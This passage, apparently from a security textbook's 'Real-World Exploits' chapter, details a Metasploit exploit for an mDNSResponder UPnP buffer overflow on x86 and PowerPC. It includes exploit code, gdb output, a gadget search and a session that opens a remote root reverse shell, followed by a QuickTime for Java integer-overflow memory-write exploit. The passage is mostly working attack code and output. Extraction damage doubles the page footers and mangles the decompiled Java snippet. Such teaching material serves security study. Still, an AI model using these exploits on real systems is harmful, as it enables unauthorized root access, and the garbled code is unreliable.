0x53dbc : 0x00000000
(gdb) x/4x 0x53dc0 - 4
0x53dbc : 0x00000000 0x41414141
0x41414141 0x41414141
The address of our attack string, 0x00053dc0, has a NULL byte in its most-
signifi cant byte. Luckily, x86 is little-endian so this byte comes last when it is
written in a string. We will use the automatic addition of the terminating NULL
byte by the vulnerable strcpy() to create this byte for us. That means our attack
string will end with the three least-signifi cant bytes of this address, and we
must place our payload at the beginning of the attack string.
This gives us our fi nal exploit method:
def exploit
upnp_port = scan_for_upnp_port()
datastore[‘RPORT’] = upnp_port
socket = connect_udp()
space = “A” * 21000
space[0, payload.encoded.length] = payload.encoded
boom = Rex::Text.pattern_create(147)
boom[120, 4] = [target[‘Magic’]].pack(‘V’)
boom[144, 3] = [target[‘g_szRouterHostPortDesc’]].pack(‘V’)[0..2]
upnp_reply =
“HTTP/1.1 200 Ok\r\n” +
“ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n” +
“Location: http://#{space + boom}\r\n\r\n”
9955336633cc1100..iinndddd 228822 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 283
puts “[*] Sending evil UPNP response”
socket.put(upnp_reply)
puts “[*] Sleeping to give mDNSDaemonIdle() a chance to run”
sleep(10)
handler()
disconnect_udp()
end
Exploiting on PowerPC
Exploitation of this vulnerability on PowerPC is simpler than on x86. Again we
will overwrite the mDNS structure in the data segment and specifi cally over-
write the MainCallback function pointer to obtain control of execution.
First we will need a similar magic address to the one we used on x86, with
the same constraints. We will start by triggering the vulnerability with a long
string and a pattern string for the mDNS structure with the magic address
patched in. Here is the initial exploit method.
def exploit
upnp_port = scan_for_upnp_port()
datastore[‘RPORT’] = upnp_port
socket = connect_udp()
space = “A” * target[‘Offset’]
pattern = Rex::Text.pattern_create(48)
pattern[20, 4] = [target[‘Magic’]].pack(‘N’)
boom = space + pattern
upnp_reply =
“HTTP/1.1 200 Ok\r\n” +
“ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n” +
“Location: http://#{boom}\r\n\r\n”
puts “[*] Sending evil UPNP response”
socket.put(upnp_reply)
puts “[*] Sleeping to give mDNSDaemonIdle() a chance to run”
sleep(10)
handler()
disconnect_udp()
end
When we attach a debugger to mDNSResponder and catch the exception, we
can see that we have jumped to an address from our pattern string.
9955336633cc1100..iinndddd 228833 11//2255//0099 44::4422::4477 PPMM
284 Part III ■ Exploitation
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x34416234
0x34416234 in ?? ()
(gdb) info registers
r0 0xa8a4 43172
r1 0xbffff300 3221222144
r2 0x1 1
r3 0x45400 283648
r4 0xfffeff01 4294901505
r5 0x0 0
r6 0xa21c0000 2719744000
r7 0xb815a 754010
r8 0x0 0
r9 0xb97ee7f2 3112101874
r10 0x45400 283648
r11 0x417ee7f2 1098835954
r12 0x34416235 876700213
r13 0x0 0
r14 0x0 0
r15 0x0 0
r16 0x0 0
r17 0x0 0
r18 0x0 0
r19 0x0 0
r20 0x0 0
r21 0x0 0
r22 0x0 0
r23 0x0 0
r24 0x45400 283648
r25 0x417ee7ec 1098835948
r26 0x40000 262144
r27 0x40000 262144
r28 0x0 0
r29 0x1387 4999
r30 0x40000 262144
r31 0x40000 262144
pc 0x34416234 876700212
ps 0x4200d030 1107349552
cr 0x84000224 2214593060
lr 0xa8a4 43172
ctr 0x34416235 876700213
xer 0x20000007 536870919
mq 0x0 0
fpscr 0x82024000 2181185536
vscr 0x10000 65536
vrsave 0x0 0
(gdb) x/x $r26
0x40000 : 0x00000000
Notice in this code that several registers point to 0x40000, which is in the
middle of a global string g_szUSN. From examination of the mDNSResponder
9955336633cc1100..iinndddd 228844 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 285
source code, we can see that the contents of the USN header in the UPnP
response are copied into this string. This is an ideal place to store our payload,
and it will be easy to fi nd a number of useful addresses that will let us branch
into one of the registers pointing to this address. We can easily fi nd these useful
addresses by grepping through the disassembly of dyld.
% otool -tv /usr/lib/dyld | grep -B 1 bctr | grep -A 1 –E \
‘mtspr.*(r26|r27|r30|r31)’
8fe2d304 mtspr ctr,r27
8fe2d308 bctrl
--
8fe2d398 mtspr ctr,r26
8fe2d39c bctrl
--
8fe2d3cc mtspr ctr,r26
8fe2d3d0 bctrl
--
…
Just as before, we calculate the offset of MainCallback using Metasploit’s pat-
tern_offset.rb and patch this into our attack string. We also create a USN header
in our response that contains our payload at the correct offset. Our exploit now
looks like the following.
def exploit
upnp_port = scan_for_upnp_port()
datastore[‘RPORT’] = upnp_port
socket = connect_udp()
space = “A” * target[‘Offset’]
pattern = Rex::Text.pattern_create(48)
pattern[20, 4] = [target[‘Magic’]].pack(‘N’)
#
# r26, r27, r30, r31 point to g_szUSN+556
# Ret should be a branch to one of these registers
# And we make sure to put our payload in the USN header
#
pattern[44, 4] = [target[‘Ret’]].pack(‘N’)
boom = space + pattern
#
# Start payload at offset 556 within USN
#
usn = “A” * 556 + payload.encoded
upnp_reply =
“HTTP/1.1 200 Ok\r\n” +
“ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n” +
“USN: #{usn}\r\n” +
9955336633cc1100..iinndddd 228855 11//2255//0099 44::4422::4477 PPMM
286 Part III ■ Exploitation
“Location: http://#{boom}\r\n\r\n”
puts “[*] Sending evil UPNP response”
socket.put(upnp_reply)
puts “[*] Sleeping to give mDNSDaemonIdle() a chance to run”
sleep(10)
handler()
disconnect_udp()
end
Finally we try out our completed exploit in Metasploit to make sure it works.
As you can see, we get a nice remote root shell:
% ./msfconsole
o 8 o o
8 8 8
ooYoYo. .oPYo. o8P .oPYo. .oPYo. .oPYo. 8 .oPYo. o8 o8P
8’ 8 8 8oooo8 8 .oooo8 Yb.. 8 8 8 8 8 8 8
8 8 8 8. 8 8 8 ‘Yb. 8 8 8 8 8 8 8
8 8 8 `Yooo’ 8 `YooP8 `YooP’ 8YooP’ 8 `YooP’ 8 8
..:..:..:.....:::..::.....::.....:8.....:..:.....::..::..:
::::::::::::::::::::::::::::::::::8:::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
=[ msf v3.2-release
+ -- --=[ 308 exploits - 172 payloads
+ -- --=[ 20 encoders - 6 nops
=[ 67 aux
resource> set LHOST 10.13.37.107
LHOST => 10.13.37.107
resource> set RHOST 10.13.37.108
RHOST => 10.13.37.108
resource> set PAYLOAD osx/ppc/shell_reverse_tcp
PAYLOAD => osx/ppc/shell_reverse_tcp
resource> set ENCODER ppc/longxor
ENCODER => ppc/longxor
resource> use exploit/osx/mdns/upnp_location
msf exploit(upnp_location) > exploit
[*] Started reverse handler
[*] Listening for UPNP requests on: http://10.13.37.107:1900
[*] Sending UPNP Discovery replies…
[*] Sending evil UPNP response
[*] Sleeping to give mDNSDaemonIdle() a chance to run
[*] Command shell session 1 opened (10.13.37.107:4444 ->
10.13.37.108:49166)
9955336633cc1100..iinndddd 228866 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 287
id
uid=0(root) gid=0(wheel) groups=0(wheel)
uname -a
Darwin MacMini.local 8.0.0 Darwin Kernel Version 8.0.0: Sat
Mar 26 14:15:22 PST 2005; root:xnu-792.obj~1/RELEASE_PPC Power
Macintosh powerpc
pwd
/
exit
[*] Command shell session 1 closed.
msf exploit(upnp_location) >
QuickTime QTJava toQTPointer() Memory Access
QuickTime 7 prior to 7.1.5 had a serious vulnerability in QuickTime for Java
that allowed a malicious applet to write to arbitrary out-of-bounds memory
locations. The specifi c vulnerability was caused by insuffi cient validation to
the QTHandleRef.toQTPointer() method, leading to an integer overfl ow dur-
ing array bounds calculations. This vulnerability affected all operating sys-
tems supported by Apple QuickTime and browsers using the QuickTime
plug-in. This means it was exploitable on everything from Safari on Mac OS
X to Firefox or Internet Explorer 7 running on Windows Vista if the user had
installed QuickTime or iTunes. This is also the vulnerability that Dino Dai Zovi
discovered and exploited in one night to win the fi rst PWN2OWN contest at
CanSecWest 2007.
A QTPointerRef object is a “smart” pointer in Java. It is aware of the size of
the buffer that it points to and it attempts to ensure that the data reading and
writing methods that it provides remain within that buffer. QTPointerRefs had
a protected constructor so that an applet could not create a QTPointerRef of an
arbitrary memory location and size. However, a QTPointerRef can be created
from other objects, such as a QTHandleRef. That was the source of this vulner-
ability—a method in QTHandleRef that created QTPointerRefs insecurely.
We can use the Jad Java decompiler to decompile Java class fi les into read-
able Java source code. We have done this and cleaned up the output a little for
QTHandleRef.toQTPointer():
public QTPointerRef toQTPointer(int offset, int length)
{
length = (length + offset  sourceSize ||
destinationOffset + readLength > destinationSize ||
sourceOffset < 0 ||
destinationOffset < 0)
throw new ArrayIndexOutOfBoundsException();
else
return;
}
In reading this code, consider what happens when either of the offsets is
0x7FFFFFFF. This value is a positive integer, so it passes the checks for nega-
tive integers. When it is added to any size of readLength, it becomes negative,
and not just negative; the integer wraps over to become the most negative value
possible for a 32-bit signed integer. As a concrete example, consider adding a
length of 1 to an offset of 2,147,483,647 (0x7FFFFFFF as a signed integer). This
results in -2,147,483,648 (0x80000000 as a signed integer). This value passes all
of the validation done in doBoundsChecks() and allows the caller to access
out-of-bounds memory.
This example shows how diffi cult it can be to validate memory addresses and
bounds (which should be considered unsigned 32-bit integers) in a language
like Java that supports only 32-bit signed integers.
Exploiting toQTPointer()
First we create a zero-size QTHandle and do not clear the memory. This will
allocate a zero-size native memory buffer.
QTHandle handle = new QTHandle(0, false);
Next we convert the handle to a QTPointerRef. The method takes an off-
set and length argument. We will specify both an offset of 1 and length of
0x7FFFFFFF (2,147,483,647). This value is a special boundary condition; it is
the largest positive signed integer, but if you add one to it, it becomes the
smallest negative signed integer. These values trick both toQTPointer() and
9955336633cc1100..iinndddd 228888 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 289
checkQTObjectSizeAndOffset(), resulting in a QTPointerRef being returned
with an allocated size of 0 but an allowed size of 2,147,483,647 bytes. This means
that it did not actually allocate 2GB of memory, but it will allow us to write up
to 2GB of data into it.
QTPointerRef pointer = handle.toQTPointer(1, 0x7fffffff);
At this point we have a magic QTPointerRef that can write to 2GB of the
process memory. This is half of the 32-bit address space. We don’t know where
exactly our writable memory begins or ends. This makes it diffi cult to write a
reliable exploit. Luckily, the QuickTime for Java programmers were kind enough
to supply us with the native memory address of all QTObjects. QTObject.ID()
returns a QTObject’s native memory address, as shown here:
nativeAddress = QTObject.ID(pointer);
At this point we have a QTPointerRef that will allow us to write up to 2GB
of data to a known native memory address. We can use this to write data to a
chosen memory address by calculating a fake “offset” within our QTPointerRef
“buffer” memory. The following lines use the QTPointerRef.copyFromArray()
method to write a chosen value (what) to a chosen memory address (where).
int box[] = new int[1];
box[0] = what;
int offset = where - nativeAddress;